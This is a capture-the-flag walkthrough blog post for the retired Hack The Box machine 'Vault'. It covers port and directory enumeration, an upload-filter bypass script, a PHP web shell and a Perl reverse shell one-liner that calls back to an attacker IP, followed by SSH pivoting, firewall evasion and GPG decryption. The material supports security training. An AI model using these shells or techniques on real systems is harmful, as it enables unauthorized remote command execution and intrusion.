---
layout: post
title: "Vault: Hack The Box Walkthrough"
date: 2019-04-06 17:48:12 +0000
last_modified_at: 2019-04-12 03:42:44 +0000
category: Walkthrough
tags: ["Hack The Box", Vault, retired]
comments: true
image:
  feature: vault-htb-walkthrough.jpg
  credit: qimono / Pixabay
  creditlink: https://pixabay.com/en/key-keyhole-lock-security-unlock-2114046/
---

This post documents the complete walkthrough of Vault, a retired vulnerable [VM][1] created by [nol0gz][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

Vault is a retired vulnerable VM from Hack The Box.

### Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p22,80 -A --reason -oN nmap.txt 10.10.10.109
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)
|   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)
|_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

`nmap` finds `22/tcp` and `80/tcp` open. Nothing extraordinary. This is how the site looks like.

<a class="image-popup">
![6b88c991.png](/assets/images/posts/vault-htb-walkthrough/6b88c991.png)
</a>

### Directory/File Enumeration

Let's go ahead and make a guess that everything related to Sparklays is behind the directory `/sparklays`. We'll use `wfuzz` coupled with SecLists's `quickhits.txt` and see what we can find.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --hc '403,404' http://10.10.10.109/sparklays/FUZZ
********************************************************
* Wfuzz 2.3.1 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.109/sparklays/FUZZ
Total requests: 2371

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000506:  C=200     13 L       38 W          615 Ch        "/admin.php"
001505:  C=200      3 L        2 W           16 Ch        "/login.php"

Total time: 48.81987
Processed Requests: 2371
Filtered Requests: 2369
Requests/sec.: 48.56628
```

Not too shabby. Now, let's change to another wordlist and see if we can discover other directories.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc '403,404' http://10.10.10.109/sparklays/FUZZ
********************************************************
* Wfuzz 2.3.1 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.109/sparklays/FUZZ
Total requests: 4593

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000442:  C=200     13 L       38 W          615 Ch        "admin.php"
001339:  C=301      9 L       28 W          323 Ch        "design"

Total time: 93.51900
Processed Requests: 4593
Filtered Requests: 4591
Requests/sec.: 49.11301
```

Let's go deeper with `wfuzz`'s own wordlists.

```
# wfuzz -w common.txt -w extensions_comment.xt --hc 404 http://10.10.10.109/sparklays/design/FUZZ
********************************************************
* Wfuzz 2.3.1 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.109/sparklays/design/FUZZFUZ2Z
Total requests: 26600

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

007571:  C=200      3 L        8 W           72 Ch        "design - .html"
024304:  C=403     11 L       32 W          312 Ch        "uploads - /"

Total time: 115.6137
Processed Requests: 26600
Filtered Requests: 26598
Requests/sec.: 230.0764
```
Awesome. `wfuzz` finds another page. This is how it looks like.

<a class="image-popup">
![f098ee0c.png](/assets/images/posts/vault-htb-walkthrough/f098ee0c.png)
</a>

The new page exposes a new attack surface at `/changelogo.php` as well.

<a class="image-popup">
![33bd9acb.png](/assets/images/posts/vault-htb-walkthrough/33bd9acb.png)
</a>


### File Upload Bypass

What we are seeing here is a classic file upload attack, specifically by discovering the whitelisted file extensions. To that end, I wrote a `bash` script with `curl` as the main driver and by supplying the script with a wordlist containing a large number of file extensions, I can determine which extensions are whitelisted.

The wordlist is derived from `/etc/mime.types` like so.

```
awk '{ $1 = ""; print $0 }' /etc/mime.types | sed -r -e 's/^ //g' -e '1,26d' -e '/^$/d' | tr ' ' '\n' > extensions.txt
```
The script is shown below.

<div class="filename"><span>filter.sh</span></div>

```bash
#!/bin/bash

EXT=$1
HOST=10.10.10.109
URL=http://$HOST/sparklays/design/changelogo.php
UPLOADS=http://$HOST/sparklays/design/uploads

curl -s \
     -F "file=@info;filename=info.${EXT}" \
     -F "submit=upload+file" \
     $URL \
| sed '1!d' \
| cut -d '<' -f1 \
| grep success &>/dev/null && echo "[+] Uploaded: $UPLOADS/info.${EXT}"
```

The script takes in a file extension as argument. I'm using GNU Parallel to speed things up like so.

<a class="image-popup">
![33494eeb.png](/assets/images/posts/vault-htb-walkthrough/33494eeb.png)
</a>

You can see that these are the whitelisted file extensions and only `.php5` is executable. The file `info` contains the following PHP code:

```
<?php phpinfo(); ?>
```

<a class="image-popup">
![9ec9d39a.png](/assets/images/posts/vault-htb-walkthrough/9ec9d39a.png)
</a>

With that in mind, we can craft another file with the following PHP code and save it as `cmd.php5`. After uploading, the file will allow us to execute remote commands.

```
<?php echo shell_exec($_GET[0]); ?>
```

<a class="image-popup">
![fb19a5ac.png](/assets/images/posts/vault-htb-walkthrough/fb19a5ac.png)
</a>

Perfect.

### Low-Privilege Shell

We can now execute a reverse shell. I always go for a Perl reverse shell simply because it's more likely to be available than any other interpreted languages such as Python.

```
perl -e 'use Socket;$i="10.10.14.109";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

It's best to urlencode the code to prevent complications because we are entering it on the browser's address bar.

<a class="image-popup">
![7af10ac4.png](/assets/images/posts/vault-htb-walkthrough/7af10ac4.png)
</a>

Awesome. We have shell. Let's go through the usual process to [upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) the shell to full TTY.

During enumeration of `www-data`'s account, I found the password (`Dav3therav3123`) to `dave`'s SSH account and other pertinent information at `/home/dave/Desktop`.

<a class="image-popup">
![1f6b2197.png](/assets/images/posts/vault-htb-walkthrough/1f6b2197.png)
</a>

Voila. Another shell this time as `dave`.

<a class="image-popup">
![83c88ad8.png](/assets/images/posts/vault-htb-walkthrough/83c88ad8.png)
</a>

Notice that the host has many virtual network interfaces. One of them is a virtual bridge that links to `192.168.122.0/24`.

<a class="image-popup">
![6cb58904.png](/assets/images/posts/vault-htb-walkthrough/6cb58904.png)
</a>

### DNS + Configurator

Let's use the following command to scan the ports of `192.168.122.4` to see what we are up against.

```
$ for p in $(seq 1 10000); do (nc -w1 -nvz 192.168.122.4 $p 2>&1 | grep succeed); done
Connection to 192.168.122.4 22 port [tcp/*] succeeded!
Connection to 192.168.122.4 80 port [tcp/*] succeeded!
```

Let's do a dynamic port-forwarding with SSH. It opens up a SOCKS proxy on my attacking machine which I can then use to link up to `192.168.122.0/24`.

```
ssh -D9999 dave@10.10.10.109 -f -N 2>/dev/null
```

<a class="image-popup">
![4a118c43.png](/assets/images/posts/vault-htb-walkthrough/4a118c43.png)
</a>

The proxy on the browser is set up to point to `socks5://127.0.0.1:9999`.

### Directory/Files Redux

Now that we have a new enumeration point, let's do what we always do: `wfuzz`

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc '403,404' -t 20 -p 127.0.0.1:9999:SOCKS5 http://192.168.122.4/FUZZ
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://192.168.122.4/FUZZ
Total requests: 4593

==================================================================
ID      Response   Lines      Word         Chars          Payload    
==================================================================

002095:  C=200      6 L       25 W          195 Ch        "index.php"
002743:  C=200      1 L        6 W           36 Ch        "notes"

Total time: 64.27585
Processed Requests: 4593
Filtered Requests: 4591
Requests/sec.: 71.45762
```

Notice I'm pointing `wfuzz` to the SOCKS proxy set up earlier. What do we have here? `notes` looks interesting.

<a class="image-popup">
![3c6dd785.png](/assets/images/posts/vault-htb-walkthrough/3c6dd785.png)
</a>

It seems to be suggesting the presence of two files: `123.ovpn` and `script.sh`.

<a class="image-popup">
![ac8af4ee.png](/assets/images/posts/vault-htb-walkthrough/ac8af4ee.png)
</a>

<a class="image-popup">
![ecb360c0.png](/assets/images/posts/vault-htb-walkthrough/ecb360c0.png)
</a>

Here's what I think is happening here. Editing the text area in `/vpnconfig.php` and hitting **Update file** writes to `123.ovpn` and hitting the link **Test VPN** executes `script.sh`.

I know that OpenVPN client configuration file can execute shell commands but I need to find a OpenVPN server to connect to. An OpenVPN server listens on `1194/udp` by default.

Back in `dave`'s shell, I run the following command to find a valid OpenVPN server.

<a class="image-popup">
![fd3274f1.png](/assets/images/posts/vault-htb-walkthrough/fd3274f1.png)
</a>

Ha ha. It's almost as if the creator anticipates mistakes to be made, that's why he catered for so many servers. Now, let's see if these OpenVPN commands will work.

<a class="image-popup">
![c5f74644.png](/assets/images/posts/vault-htb-walkthrough/c5f74644.png)
</a>

Meanwhile, I have a `nc` listener set at `192.168.122.1` on `2323/tcp`

<a class="image-popup">
![1453c035.png](/assets/images/posts/vault-htb-walkthrough/1453c035.png)
</a>

A `root` shell to DNS!

During enumeration, I discovered `dave`'s SSH password (`dav3gerous567`) to DNS and he is able to `sudo` as `root`. That saves us from spawning a shell through OpenVPN every time and SSH provides a far more superior shell.

<a class="image-popup">
![3160fc55.png](/assets/images/posts/vault-htb-walkthrough/3160fc55.png)
</a>

The file `user.txt` is at `dave`'s home directory.

<a class="image-popup">
![f5917e6f.png](/assets/images/posts/vault-htb-walkthrough/f5917e6f.png)
</a>

I also discovered DNS has access to `192.168.5.0/24` through the firewall at `192.168.122.5`. Check out the routing table.

<a class="image-popup">
![2cf3c871.png](/assets/images/posts/vault-htb-walkthrough/2cf3c871.png)
</a>

I'm betting the Vault is one of the hosts in the `192.168.5.0/24` subnet but which one? I went through the logs searching for hints the creator might have left and here's what I found.

<a class="image-popup">
![a4d59e66.png](/assets/images/posts/vault-htb-walkthrough/a4d59e66.png)
</a>

It's clear the firewall only accepts inbound traffic with a source port of `4444/tcp` to the host `192.168.5.2` listening at `987/tcp`.

Let's see what's behind `987/tcp` with `ncat` and the `-p` option to indicate our source port.

<a class="image-popup">
![99e445ae.png](/assets/images/posts/vault-htb-walkthrough/99e445ae.png)
</a>

I see. `987/tcp` is a wrapper for SSH.

SSH comes with a slew of options, particularly the ProxyCommand option allows `ssh` to proxy traffic through a network utility tool like `ncat`.

<a class="image-popup">
![1802494e.png](/assets/images/posts/vault-htb-walkthrough/1802494e.png)
</a>

This is awesome, isn't it?

I noticed a pattern of `dave`'s having SSH accounts on all the hosts encountered thus far, so that's what I'm going to try.

<a class="image-popup">
![689779f1.png](/assets/images/posts/vault-htb-walkthrough/689779f1.png)
</a>

Sweet. The password is `dav3gerous567`. However, `dave`'s default shell is a restricted one. Fret not, we just have to re-login like so.

<a class="image-popup">
![f11979a4.png](/assets/images/posts/vault-htb-walkthrough/f11979a4.png)
</a>

The file `root.txt` is here but appears encrypted with GPG.

<a class="image-popup">
![6396cd2c.png](/assets/images/posts/vault-htb-walkthrough/6396cd2c.png)
</a>

It doesn't appear the file is encrypted on this host because the directory `.gnupg` is not here. There's a couple more hints to suggest the decryption is to be done elsewhere.

1. Tools like `base64`, `hexdump` and `xxd` are not available on `vault`.
2. Python 3 is hidden as `python3m` on `vault`.
3. The passphrase `itscominghome` found on `ubuntu` suggested the first `dave` SSH account.

We can print a `base64`-encoded string of the file `root.txt.gpg` like so.

<a class="image-popup">
![b05dd087.png](/assets/images/posts/vault-htb-walkthrough/b05dd087.png)
</a>

Copy the string to the first `dave` shell and decrypt it like so.

<a class="image-popup">
![84e46fc9.png](/assets/images/posts/vault-htb-walkthrough/84e46fc9.png)
</a>

The passphrase is indeed `itscominghome`. And you get `root.txt` after the decryption.

<a class="image-popup">
![f5311724.png](/assets/images/posts/vault-htb-walkthrough/f5311724.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/161
[2]: https://www.hackthebox.eu/home/users/profile/5621
[3]: https://www.hackthebox.eu/
